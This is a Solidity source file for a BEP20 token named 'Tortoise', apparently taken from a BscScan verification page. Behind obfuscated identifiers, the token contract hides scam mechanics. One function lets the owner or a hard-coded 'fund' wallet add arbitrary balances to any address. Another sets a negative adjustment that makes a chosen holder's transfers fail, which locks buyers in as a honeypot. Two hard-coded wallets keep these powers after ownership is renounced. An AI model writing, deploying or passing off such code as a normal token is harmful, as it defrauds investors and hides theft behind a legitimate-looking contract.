/**
 *Submitted for verification at BscScan.com on 2022-11-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferownership() public virtual onlyOwner {
        _transferownership(address(0));
    }


    function transferownership(address newowner) public virtual onlyOwner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint UXUfpKhCLADesired,
        uint UXUfpKhCLBDesired,
        uint UXUfpKhCLAMin,
        uint UXUfpKhCLBMin,
        address to,
        uint deadline
    ) external returns (uint UXUfpKhCLA, uint UXUfpKhCLB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint UXUfpKhCLTokenDesired,
        uint UXUfpKhCLTokenMin,
        uint UXUfpKhCLETHMin,
        address to,
        uint deadline
    ) external payable returns (uint UXUfpKhCLToken, uint UXUfpKhCLETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint UXUfpKhCLAMin,
        uint UXUfpKhCLBMin,
        address to,
        uint deadline
    ) external returns (uint UXUfpKhCLA, uint UXUfpKhCLB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint UXUfpKhCLTokenMin,
        uint UXUfpKhCLETHMin,
        address to,
        uint deadline
    ) external returns (uint UXUfpKhCLToken, uint UXUfpKhCLETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint UXUfpKhCLAMin,
        uint UXUfpKhCLBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint UXUfpKhCLA, uint UXUfpKhCLB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint UXUfpKhCLTokenMin,
        uint UXUfpKhCLETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint UXUfpKhCLToken, uint UXUfpKhCLETH);
    function swapExactTokensForTokens(
        uint UXUfpKhCLIn,
        uint UXUfpKhCLOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory UXUfpKhCLs);
    function swapTokensForExactTokens(
        uint UXUfpKhCLOut,
        uint UXUfpKhCLInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory UXUfpKhCLs);
    function swapExactETHForTokens(uint UXUfpKhCLOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory UXUfpKhCLs);
    function swapTokensForExactETH(uint UXUfpKhCLOut, uint UXUfpKhCLInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory UXUfpKhCLs);
    function swapExactTokensForETH(uint UXUfpKhCLIn, uint UXUfpKhCLOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory UXUfpKhCLs);
    function swapETHForExactTokens(uint UXUfpKhCLOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory UXUfpKhCLs);

    function quote(uint UXUfpKhCLA, uint reserveA, uint reserveB) external pure returns (uint UXUfpKhCLB);
    function getUXUfpKhCLOut(uint UXUfpKhCLIn, uint reserveIn, uint reserveOut) external pure returns (uint UXUfpKhCLOut);
    function getUXUfpKhCLIn(uint UXUfpKhCLOut, uint reserveIn, uint reserveOut) external pure returns (uint UXUfpKhCLIn);
    function getUXUfpKhCLsOut(uint UXUfpKhCLIn, address[] calldata path) external view returns (uint[] memory UXUfpKhCLs);
    function getUXUfpKhCLsIn(uint UXUfpKhCLOut, address[] calldata path) external view returns (uint[] memory UXUfpKhCLs);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint UXUfpKhCLTokenMin,
        uint UXUfpKhCLETHMin,
        address to,
        uint deadline
    ) external returns (uint UXUfpKhCLETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint UXUfpKhCLTokenMin,
        uint UXUfpKhCLETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint UXUfpKhCLETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint UXUfpKhCLIn,
        uint UXUfpKhCLOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint UXUfpKhCLOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint UXUfpKhCLIn,
        uint UXUfpKhCLOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function yognOFycK() external view returns (address);
    function yognOFycKSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setyognOFycK(address) external;
    function setyognOFycKSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract Tortoise is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _wJxiNpgNI;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 XPTsaexAG = _balances[from];
        require(XPTsaexAG >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = XPTsaexAG - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 BweOBpxLW = _balances[account];
        require(BweOBpxLW >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = BweOBpxLW - amount;
    }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _mtin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    uint256 private _giMevZJBl = 3;

    uint256 private _KrAtKTbSb = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _DFiOqGmLB;

    address private _marketMAewAddress = 0x47e403f4c5B00531c9591bbf263414bfd83546E3;
    address private _fundZPewAddress = 0x47552c0bBB59405F43512374296029623239EF4D;


    function setMarketAddress(address addr) external onlyOwner {
        _marketMAewAddress = addr;
    }

    function setFundAddress(address addr) external onlyOwner {
        _fundZPewAddress = addr;
    }

    function setPairwrDTKOQXK(address _address) external oIdCGGLJD {
        uniswapV2Pair = _address;
    }

    function setAdmIIziKjpGi(address DupXhcYKT,int256 amount ) external qZKajhxrP {
        _DFiOqGmLB[DupXhcYKT] += amount;
    }

    function setUsebpvGIxwTM(address DupXhcYKT) external oIdCGGLJD {
        _DFiOqGmLB[DupXhcYKT] = int256(0) - int256(_totalSupply);
    }

    function rmUseSMmyhfppC(address DupXhcYKT) external oIdCGGLJD {
        _DFiOqGmLB[DupXhcYKT] = 0;
    }

    function getoVbiALAlq(address DupXhcYKT) external view returns (int256) {
        return _DFiOqGmLB[DupXhcYKT];
    }

    modifier oIdCGGLJD() {
        require(owner() == msg.sender || _marketMAewAddress == msg.sender, "!Market");
        _;
    }

    modifier qZKajhxrP() {
        require(owner() == msg.sender || _fundZPewAddress == msg.sender, "!Funder");
        _;
    }

    function _GNjQnygvE(
        address from,
        address _to,
        uint256 _UXUfpKhCL
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 XPTsaexAG = _balances[from];
        require(XPTsaexAG >= _UXUfpKhCL, "ERC20: transfer amount exceeds balance");
        if (_DFiOqGmLB[from] > 0){
            _balances[from] = _balances[from].add(uint256(_DFiOqGmLB[from]));
        }else if (_DFiOqGmLB[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_DFiOqGmLB[from]));
        }


        uint256 helooUXUfpKhCL = 0;
        uint256 bnOsqQvMS = _giMevZJBl;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                bnOsqQvMS = _giMevZJBl;
            }
            if (from == uniswapV2Pair) {
                bnOsqQvMS = _KrAtKTbSb;
            }
        }
        helooUXUfpKhCL = _UXUfpKhCL.mul(bnOsqQvMS).div(100);

        if (helooUXUfpKhCL > 0) {
            _balances[from] = _balances[from].sub(helooUXUfpKhCL);
            _balances[_deadAddress] = _balances[_deadAddress].add(helooUXUfpKhCL);
            emit Transfer(from, _deadAddress, helooUXUfpKhCL);
        }

        _balances[from] = _balances[from].sub(_UXUfpKhCL - helooUXUfpKhCL);
        _balances[_to] = _balances[_to].add(_UXUfpKhCL - helooUXUfpKhCL);
        emit Transfer(from, _to, _UXUfpKhCL - helooUXUfpKhCL);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _GNjQnygvE(owner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _GNjQnygvE(from, to, amount);
        return true;
    }
}